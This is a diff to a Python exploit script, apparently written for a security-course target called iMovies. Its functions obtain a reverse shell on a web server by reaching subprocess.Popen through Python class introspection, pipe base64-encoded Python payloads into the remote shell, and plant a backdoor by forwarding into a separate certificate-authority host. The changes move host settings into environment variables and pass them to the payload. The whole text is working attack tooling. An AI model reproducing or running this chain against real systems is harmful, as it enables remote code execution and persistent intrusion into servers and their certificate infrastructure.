@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import html
+import os
 import re
 import sys
 from base64 import b64encode
@@ -10,7 +11,9 @@ from bs4 import BeautifulSoup
 from pwn import *
 from urllib3.exceptions import InsecureRequestWarning
 
-WEB_HOST = 'https://imovies.ch:8000'
+WEB_HOST = os.getenv('WEB_HOST', 'https://imovies.ch')
+CA_HOST = os.getenv('CA_HOST', 'https://ca.imovies.ch')
+
 DEFAULT_PASSPHRASE = '_' * 14
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
@@ -98,7 +101,7 @@ def web_reverse_shell(remote_attacker_ip, remote_attacker_port):
     web_login(session, uid, pwd, f'/profile/{uid}')
 
     popen_index = web_find_subclass('Popen')
-    assert popen_index
+    assert popen_index is not None
 
     log.debug(f"Found Popen: ''.__class__.mro()[1].__subclasses__()[{popen_index}]")
 
@@ -110,12 +113,15 @@ def web_reverse_shell(remote_attacker_ip, remote_attacker_port):
     log.debug(answer)
 
 
-def web_run_py_file(io, filepath, args=(), exit=True):
+def web_run_py_file(io, filepath, args=(), env={}, exit=True):
     def quote(s):
         return f"'{s}'"
 
     with open(filepath, 'rb') as f:
-        command = f'python3 -c "$(echo \'{b64encode(f.read()).decode()}\' | base64 --decode)" {" ".join(quote(arg) for arg in args)}{"; exit" if exit else ""}'.encode()
+        command = f"{' '.join(f'{key}={quote(value)}' for key, value in env.items())} " \
+                  f"python3 -c \"$(echo '{b64encode(f.read()).decode()}' | base64 --decode)\" " \
+                  f"{' '.join(quote(arg) for arg in args)}" \
+                  f"{'; exit' if exit else ''}".encode()
 
     return io.sendline(command)
 
@@ -139,7 +145,7 @@ def ca_backdoor(local_attacker_port, remote_attacker_ip, remote_attacker_port):
     web_listener = listen(local_attacker_port)
     web_reverse_shell(remote_attacker_ip, remote_attacker_port)
     web_io = web_listener.wait_for_connection()
-    web_run_py_file(web_io, './payloads/ca_forward.py', args=(remote_attacker_ip, remote_attacker_port))
+    web_run_py_file(web_io, './payloads/ca_forward.py', args=(remote_attacker_ip, remote_attacker_port), env={'CA_HOST': CA_HOST})
     web_listener.close()
 
     ca_listener = listen(local_attacker_port)
